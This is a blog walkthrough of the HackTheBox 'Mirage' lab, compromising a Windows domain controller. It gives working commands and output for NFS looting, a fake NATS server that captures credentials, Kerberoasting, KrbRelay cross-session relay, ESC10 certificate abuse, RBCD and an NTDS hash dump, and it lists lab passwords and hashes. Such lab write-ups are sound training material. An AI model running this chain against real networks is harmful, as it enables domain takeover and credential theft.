---
title: HackTheBox - Mirage
date: 2025-11-22 02:30:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [ESC10, nastscli, Cross-SessionRelay-Attack, ESC10]     
image : assets/images/5c9c46ad001394e992f1c7b830ee77e5.png
---

## Entry

```bash
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-20 02:04:21Z)
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
2049/tcp open  mountd        syn-ack ttl 127 1-3 (RPC #100005)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

I started with nmap scan because of there is no creds before start as usual nowadays HTB machine.

Alright we got **2049** port is open which is interesting.

### NFS(2049)

This is really common but u can also may wanna read here https://hacktricks.boitatech.com.br/pentesting/nfs-service-pentesting

```bash
➜  mirage showmount -e 10.10.11.78                      
Export list for 10.10.11.78:
/MirageReports (everyone)
```

- This shows us that the directory `/MirageReports` is mountable by **everyone**

Okey here is important and u may wanna watch out

```bash
## As User

mkdir NFSDIR NFSOUT
sudo mount -t nfs -o ro,vers=3,nolock 10.10.11.78:/MirageReports ./NFSDIR

## As Root
cd NFSDIR
cp * ../NFSOUT -r && chmod 777 ../NFSOUT -R && cd ../ && rm NFSDIR -rf
```

and we got 2 pdf file.

```bash
➜  mirage2 ls -la NFSOUT 
total 17496
drwxrwxrwx 2 elliot elliot    4096 Jul 19 15:04 .
drwxrwxr-x 4 elliot elliot    4096 Jul 19 15:03 ..
-rwxrwxrwx 1 root   root   8530639 Jul 19 15:04 Incident_Report_Missing_DNS_Record_nats-svc.pdf
-rwxrwxrwx 1 root   root   9373389 Jul 19 15:04 Mirage_Authentication_Hardening_Report.pdf
```

Lets open them and analyze.

![alt text](../assets/images/mirage1.png)

**Switching to Kerberos Authentication:**

To enforce Kerberos-only authentication and avoid NTLM, we begin by disabling NTLM fallback. Next, we create a DNS entry for

```
nats-svc.mirage.htb
```

and configure Responder to capture any Kerberos authentication attempts. As part of this setup, we need to modify

```
/etc/krb5.conf
```

accordingly.

### Nats

![alt text](../assets/images/mirage2.png)

Lets scan for port **4222** and look for user Dev_Account_A if its exist.

```bash
➜  mirage nmap -p 4222 mirage.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 11:29 EDT
Nmap scan report for mirage.htb (10.10.11.78)
Host is up (0.079s latency).
rDNS record for 10.10.11.78: DC01.mirage.htb

PORT     STATE SERVICE
4222/tcp open  vrml-multi-use
```

and lets see 

![alt text](../assets/images/mirage3.png)

okey its exist lets see what 4222 about.

```bash
➜  mirage nmap -sV -Pn 10.10.11.78 -p 4222 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 23:51 EDT
Nmap scan report for DC01.mirage.htb (10.10.11.78)
Host is up (0.17s latency).

PORT     STATE SERVICE         VERSION
4222/tcp open  vrml-multi-use?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4222-TCP:V=7.95%I=7%D=7/20%Time=687DB957%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1CF,"INFO\x20{\"server_id\":\"NCERMNAPPV4OYZX6LZ2B7YRSDWOKDWCB4YI4OF
SF:Q7KC3Z65NWJL5RRBLH\",\"server_name\":\"NCERMNAPPV4OYZX6LZ2B7YRSDWOKDWCB
SF:4YI4OFQ7KC3Z65NWJL5RRBLH\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_c
SF:ommit\":\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"por
SF:t\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":104857
SF:6,\"jetstream\":true,\"client_id\":16,\"client_ip\":\"10\.10\.14\.10\",
SF:\"xkey\":\"XBJRQUOZBJY2B2MMBKVELJMPUZ5ANNDYVON6QME7YZBANTI4AUODSCJV\"}\
SF:x20\r\n-ERR\x20'Authentication\x20Timeout'\r\n")%r(GenericLines,1D0,"IN
SF:FO\x20{\"server_id\":\"NCERMNAPPV4OYZX6LZ2B7YRSDWOKDWCB4YI4OFQ7KC3Z65NW
SF:JL5RRBLH\",\"server_name\":\"NCERMNAPPV4OYZX6LZ2B7YRSDWOKDWCB4YI4OFQ7KC
SF:3Z65NWJL5RRBLH\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"
SF:a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\
SF:"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstr
SF:eam\":true,\"client_id\":17,\"client_ip\":\"10\.10\.14\.10\",\"xkey\":\
SF:"XBJRQUOZBJY2B2MMBKVELJMPUZ5ANNDYVON6QME7YZBANTI4AUODSCJV\"}\x20\r\n-ER
SF:R\x20'Authorization\x20Violation'\r\n")%r(GetRequest,1D0,"INFO\x20{\"se
SF:rver_id\":\"NCERMNAPPV4OYZX6LZ2B7YRSDWOKDWCB4YI4OFQ7KC3Z65NWJL5RRBLH\",
SF:\"server_name\":\"NCERMNAPPV4OYZX6LZ2B7YRSDWOKDWCB4YI4OFQ7KC3Z65NWJL5RR
SF:BLH\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\
SF:"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\":
SF:true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,
SF:\"client_id\":18,\"client_ip\":\"10\.10\.14\.10\",\"xkey\":\"XBJRQUOZBJ
SF:Y2B2MMBKVELJMPUZ5ANNDYVON6QME7YZBANTI4AUODSCJV\"}\x20\r\n-ERR\x20'Autho
SF:rization\x20Violation'\r\n")%r(HTTPOptions,1D0,"INFO\x20{\"server_id\":
SF:\"NCERMNAPPV4OYZX6LZ2B7YRSDWOKDWCB4YI4OFQ7KC3Z65NWJL5RRBLH\",\"server_n
SF:ame\":\"NCERMNAPPV4OYZX6LZ2B7YRSDWOKDWCB4YI4OFQ7KC3Z65NWJL5RRBLH\",\"ve
SF:rsion\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\":\"go
SF:1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\":true,\"aut
SF:h_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"client_i
SF:d\":19,\"client_ip\":\"10\.10\.14\.10\",\"xkey\":\"XBJRQUOZBJY2B2MMBKVE
SF:LJMPUZ5ANNDYVON6QME
```

i did full scan and nothing understand tbh i will ash chat-gpt.

![alt text](../assets/images/mirage4.png)

okey its about **NATS**. lets check on github.

https://github.com/nats-io/nats-server/releases/tag/v2.11.6

![alt text](../assets/images/mirage5.png)

i installed that one and start analyze how to use.

At the start we dont have any credentials yet so let me search and ask chatgpt how to start. But im pretty sure we will do DNS poising or something like that.

![alt text](../assets/images/mirage6.png)

Because of this u know!!!

Chatgpt wrote me this script

```python
import socket

HOST = "10.10.14.10"  # Your attack box IP
PORT = 4222

print(f"[+] Fake NATS Server listening on {HOST}:{PORT}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)

while True:
    client, addr = s.accept()
    print(f"[+] Connection from {addr}")

    # Send fake NATS INFO banner
    banner = b'INFO {"server_id":"FAKE","version":"2.11.0","auth_required":true}\r\n'
    client.sendall(banner)
    print(f"[<] Sent banner: {banner.decode().strip()}")

    try:
        data = client.recv(1024)
        if not data:
            print("[!] No data received.")
            client.close()
            continue

        print("[>] Received:")
        print(data.decode(errors="ignore"))

        # You could optionally respond or analyze the command
        # Example: respond with fake error
        # client.sendall(b"-ERR 'fake authentication error'\r\n")

    except Exception as e:
        print(f"[!] Error reading data: {e}")

    client.close()

```

and i will start it then will update my DNS

![alt text](../assets/images/mirage7.png)

and yeah we got it.!!! our first creds at least check if its work somewhere.

![alt text](../assets/images/mirage8.png)

its not work anywehere and we got `KDC_ERR_PREAUTH_FAILED` error we will come this later so far its not work ldap or smb protocols. lets check if its work for **NATS for this one we have to instsall natscli**

https://github.com/nats-io/natscli

```python
go install github.com/nats-io/natscli/nats@v0.0.33
```

and export it

```python
➜  nats ls ~/go/bin/nats

/home/elliot/go/bin/nats
➜  nats export PATH=$PATH:$HOME/go/bin
➜  nats echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.zshrc
source ~/.zshrc
```

now we can use `nats` command.

```python
➜  nats nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'  sub test 
00:21:38 Subscribing on test
```

okey nice its seems like work.

![alt text](../assets/images/mirage9.png)

```python
➜  nats nats --help
usage: nats [<flags>] <command> [<args> ...]
```

![alt text](../assets/images/mirage10.png)

```python
nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' consumer add auth_logs irem --pull --ack explicit
```

![alt text](../assets/images/mirage11.png)

now lets read them!!!!

```python
➜  nats nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' consumer next auth_logs irem --count=1000    
[01:43:26] subj: logs.auth / tries: 1 / cons seq: 1 / str seq: 1 / pending: 4

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
```

![alt text](../assets/images/mirage12.png)

nice!!! we got new creds here!!!!! lets try that on LDAP or SMB u know!!!

### Dump BH data

```python
➜  nats nxc smb DC01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k
SMB         DC01.mirage.htb 445    DC01             [*]  x64 (name:DC01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC01.mirage.htb 445    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
➜  nats nxc ldap DC01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k
LDAP        DC01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        DC01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

okey its work for smb and LDAP we can dump BH data.

```python
➜  nats nxc smb DC01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k
SMB         DC01.mirage.htb 445    DC01             [*]  x64 (name:DC01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC01.mirage.htb 445    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
➜  nats nxc ldap DC01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k
LDAP        DC01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        DC01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

Lets analyze it!!! we have david so far

![alt text](../assets/images/mirage13.png)

nothing interesting yet but!!!!!

### Kerberoasting

![alt text](../assets/images/mirage14.png)

we found **Kerberoastable** user here so lets sdo this shit!!!

**WE ALWAYS USING `--USERS` FLAG FOR NXC TO DUMP USER LIST BUT NOW I WILL USE BH JSON FILE**

```python
➜  bloodhound cat DC01_DC01.mirage.htb_2025-07-21_020134_users.json | jq -r '.data[].Properties.samaccountname'  > fullusers.txt 
➜  bloodhound cat fullusers.txt 
null
nathan.aadam
svc_mirage
Mirage-Service$
mark.bbond
Dev_Account_B
Dev_Account_A
david.jjackson
krbtgt
Administrator
Guest
javier.mmarshall
```

okey here let do this shit.!!! but we dont need it

```python
nxc ldap DC01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --kerberoasting a.txt
```

![alt text](../assets/images/mirage15.png)

```python
➜  nats john nathan.aadam_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3edc#EDC3        (?) 
```

and we got our third creds

![alt text](../assets/images/mirage16.png)

and its seems like its work at winrm and we got user.txt sseems like

```python
➜  nats getTGT.py mirage.htb/nathan.aadam:'3edc#EDC3'                                                                                           
/usr/local/bin/getTGT.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250523.184829.f2f2b367', 'getTGT.py')
Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in nathan.aadam.ccache
➜  nats export KRB5CCNAME=nathan.aadam.ccache 
➜  nats evil-winrm -r mirage.htb -i dc01.mirage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> type user.txt
a62469f8136071b52a1e74da58d6ef97
```

## Root

I will load my beacon here and lets see. i will use my loader tho

https://github.com/lineeralgebra/shellcoderunner

![alt text](../assets/images/mirage17.png)

AS ALWAYS I WILL chcek Cross Session Relay Attack!!!!!

### Cross Session Relay Attack

```python
 execute-assembly /home/elliot/tools/RunasCs.exe "nathan.aadam" "3edc#EDC3" qwinsta
```

![alt text](../assets/images/mirage18.png)

and bamm bamm bamm bamm!!! we can grab his pass tho!!!!

https://github.com/cube0x0/KrbRelay

u can find https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/KrbRelay.exe krbrelayx here btw

we can run another beacon with an interactive logon and run krbrelay using the new beacon

```python
execute-assembly /home/elliot/tools/RunasCs.exe "nathan.aadam" "3edc#EDC3" -l 9 "C:\ProgramData\runner.exe"
```

![alt text](../assets/images/mirage19.png)

and we got new beacon now we can grab this user hash with krbrelay

```python
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm"
```

![alt text](../assets/images/mirage20.png)

lets grab it and try to crack

```python
➜  nats john mark.bbond_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1day@atime       (mark.bbond) 
```

and bammm!!! i found new creds!!! Lets see what he can do!!

![alt text](../assets/images/mirage21.png)

we can change password of Javier.

![alt text](../assets/images/mirage22.png)

and we can readGMSA password of computer account lets see…

### ForceChangePassword and ReadGMSAPassword

```python
➜  nats bloodyAD -v DEBUG --host dc01.mirage.htb -d mirage.htb -u mark.bbond -p '1day@atime' -k set password JAVIER.MMARSHALL 'Passwort123'
[+] Connection URL: ldap+kerberos-password://mirage.htb\mark.bbond:1day%40atime@dc01.mirage.htb/?serverip=10.10.11.78&dc=10.10.11.78
[*] Trying to connect to dc01.mirage.htb...
[+] Connection successful
[+] Password changed successfully!
```

but waiitt!!!!!

![alt text](../assets/images/mirage23.png)

OUR USER is DISABLED LIKE AT [HACKTHEBOX - VINTAGE](https://lineeralgebra.github.io/posts/HackTheBox-Vintage/) we will see we can check with bloodyAD tho

```python
bloodyAD --host "dc01.mirage.htb" -d "mirage.htb" --kerberos --dc-ip 10.10.11.78 -k get search  --filter "(objectClass=user)" --attr userAccountControl
```

![alt text](../assets/images/mirage24.png)

See?? its DISABLEACCOUNT. lets enable it and try again.

```python
➜  nats getTGT.py mirage.htb/mark.bbond:'1day@atime'
/usr/local/bin/getTGT.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250523.184829.f2f2b367', 'getTGT.py')
Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in mark.bbond.ccache
➜  nats 
➜  nats export KRB5CCNAME=mark.bbond.ccache 
➜  nats bloodyAD --host dc01.mirage.htb -d "MIRAGE.HTB" --dc-ip 10.10.11.78 -k remove uac JAVIER.MMARSHALL -f ACCOUNTDISABLE
```

![alt text](../assets/images/mirage25.png)

its stilll same?? lets check something different thoo WHAT I LEARNT THERE we have to clear `logonHours` here and i will use

```jsx
execute-assembly /home/elliot/tools/RunasCs.exe mark.bbond 1day@atime "powershell -c Set-ADUser -Identity javier.mmarshall -Clear logonHours"
```

![alt text](../assets/images/mirage26.png)

and bammm!!!! as u can see we can read GMSAPASSWORD tho

```python
nxc ldap DC01.mirage.htb -u JAVIER.MMARSHALL -p 'Passwort123' -k --gmsa
LDAPS       DC01.mirage.htb 636    DC01             Account: Mirage-Service$      NTLM: 305806d84f7c1be93a07aaf40f0c7866     PrincipalsAllowedToReadPassword: javier.mmarshall                                                                                                                    
```

nice!!!!

## ESC10

Unlike most ESC paths, **ESC10** can’t be directly identified using Certipy. This is because the vulnerable config (`CertificateMappingMethods` registry key) is stored locally on Domain Controllers and requires admin access to read.

- Schannel’s **UPN-based certificate mapping** is abused.
- Registry key to check (on DCs):
    
    ```
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods
    ```
    

### ✅ Exploitation Steps (Assumed):

1. **Attacker has `GenericWrite`** over a user like `victim@corp.local`.
2. Victim can enroll in a cert (like via the `User` template).
3. Domain Controller has **UPN mapping enabled**.
4. Attacker enrolls a cert for `victim@corp.local`.
5. Attacker uses that cert to **authenticate to LDAPS** as `victim@corp.local` and potentially pivot.

### ⚠️ Note:

Certipy can’t detect ESC10 directly but can help by identifying enrollable client auth cert templates, which are a required piece of the attack.

![alt text](../assets/images/mirage27.png)

So what we will do is first!!!

### Verify it

```python
shell reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
```

![alt text](../assets/images/mirage28.png)

and lets check if its same.

![alt text](../assets/images/mirage29.png)

### My Attack AIM

Now my attack aim is. Update `Mirage-Service$` ACCOUNT with DC01 with mark.bbond and request the certificate. And for use `-ldap-shell` i will update it again for mark.bbond!!!

### Update Mirage-Service$ → DC01

![alt text](../assets/images/mirage30.png)

```python
getTGT.py mirage.htb/'Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f0c7866

export KRB5CCNAME=Mirage-Service\$.ccache

certipy-ad account update -u 'Mirage-Service$' -upn 'dc01$@mirage.htb' -user 'mark.bbond' -k -no-pass -dc-ip 10.10.11.78 -target dc01.mirage.htb 
```

![alt text](../assets/images/mirage31.png)


### Requesting Certificate for mark.bbond

![alt text](../assets/images/mirage32.png)

okey its required CA and Template name how we can find??? But before do this!!!! we have to continue with mark.bbond ccache do not forget!!!

- For CA name → we can check with -M adcs
- For Template name → its default so `User`

```python
➜  nats nxc ldap DC01.mirage.htb -u mark.bbond -p '1day@atime' -k -M adcs
LDAP        DC01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        DC01.mirage.htb 389    DC01             [+] mirage.htb\mark.bbond:1day@atime 
ADCS        DC01.mirage.htb 389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        DC01.mirage.htb 389    DC01             Found PKI Enrollment Server: dc01.mirage.htb
ADCS        DC01.mirage.htb 389    DC01             Found CN: mirage-DC01-CA 
```

here is CA name `mirage-DC01-CA`

```python
➜  nats export KRB5CCNAME=mark.bbond.ccache      
➜  nats certipy-ad req -u 'mark.bbond@mirage.htb' -k -no-pass -dc-ip 10.10.11.78 -target dc01.mirage.htb -ca 'mirage-DC01-CA' -template User
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx
```

### **Revert the "victim" account's UPN to its original value.**

![alt text](../assets/images/mirage33.png)

```python
export KRB5CCNAME=Mirage-Service\$.ccache
➜  nats certipy-ad account update -u 'Mirage-Service$' -upn 'mark.bbond@mirage.htb' -user 'mark.bbond' -k -no-pass -dc-ip 10.10.11.78 -target dc01.mirage.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : mark.bbond@mirage.htb
[*] Successfully updated 'mark.bbond'
```

now we can use `-ldap-shell`

### **Authenticate to LDAPS (Schannel) as the target DC using the certificate**

![alt text](../assets/images/mirage34.png)

```python
certipy-ad auth -pfx dc01.pfx -dc-ip '10.10.11.78' -ldap-shell
```

![alt text](../assets/images/mirage35.png)

I tried everything here like dirsync, dump and add member at Administrator group but it didnt work so i will use `RBCD` here

### RBCD

```python
set_rbcd DC01$ Mirage-Service$
```

![alt text](../assets/images/mirage36.png)

we can verify that with dump BH data again btw.

```python
➜  nats getST.py -spn 'cifs/DC01.mirage.htb' -impersonate 'dc01$' 'mirage.htb/Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f0c7866
/usr/local/bin/getST.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250523.184829.f2f2b367', 'getST.py')
Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache
```

lets export it and dump everything. 

```python
nxc smb DC01.mirage.htb -k --use-kcache --ntds  
```

and dump everything.

```python
➜  nats nxc smb DC01.mirage.htb -k --use-kcache --ntds                             
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         DC01.mirage.htb 445    DC01             [*]  x64 (name:DC01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC01.mirage.htb 445    DC01             [+] mirage.htb\dc01$ from ccache 
SMB         DC01.mirage.htb 445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         DC01.mirage.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         DC01.mirage.htb 445    DC01             mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
SMB         DC01.mirage.htb 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         DC01.mirage.htb 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
SMB         DC01.mirage.htb 445    DC01             mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
SMB         DC01.mirage.htb 445    DC01             mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
SMB         DC01.mirage.htb 445    DC01             mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
SMB         DC01.mirage.htb 445    DC01             mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
SMB         DC01.mirage.htb 445    DC01             mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
SMB         DC01.mirage.htb 445    DC01             mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
SMB         DC01.mirage.htb 445    DC01             mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
SMB         DC01.mirage.htb 445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
SMB         DC01.mirage.htb 445    DC01             Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:dbac2122c1f3a94559ab8c40293f5f3b:::

```

and for flag

```python
➜  nats getTGT.py mirage.htb/'Administrator' -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3  
/usr/local/bin/getTGT.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250523.184829.f2f2b367', 'getTGT.py')
Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
➜  nats export KRB5CCNAME=Administrator.ccache 
➜  nats evil-winrm -r mirage.htb -i dc01.mirage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
mirage\administrator

```

## Creds

| username | password / hash | work at | from | privileges |
| --- | --- | --- | --- | --- |
| Dev_Account_A | hx5h7F5554fP@1337! | NATS | NATS - DNS poising | add consumer |
| david.jjackson | pN8kQmn6b86!1234@ | LDAP | NATS - phishing | kerberoast |
| nathan.aadam | 3edc#EDC3 | WINRM | kerberoast | cros session relay |
| mark.bbond | 1day@atime | LDAP | cros session relay | forcechangePassword |
| JAVIER.MMARSHALL | Passwort123 | LDAP | forcechangePassword | READGMSA |
| Mirage-Service$ | 305806d84f7c1be93a07aaf40f0c7866 | LDAP | READGMSA | ESC10 |
| Administrator | 7be6d4f3c2b9c0e3560f5a29eeb1afb3 | everywhere | dump | DA |

## Tools

https://github.com/nats-io/nats-server/releases/tag/v2.11.6

https://github.com/nats-io/natscli

https://github.com/lineeralgebra/shellcoderunner

https://github.com/cube0x0/KrbRelay

[https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication)
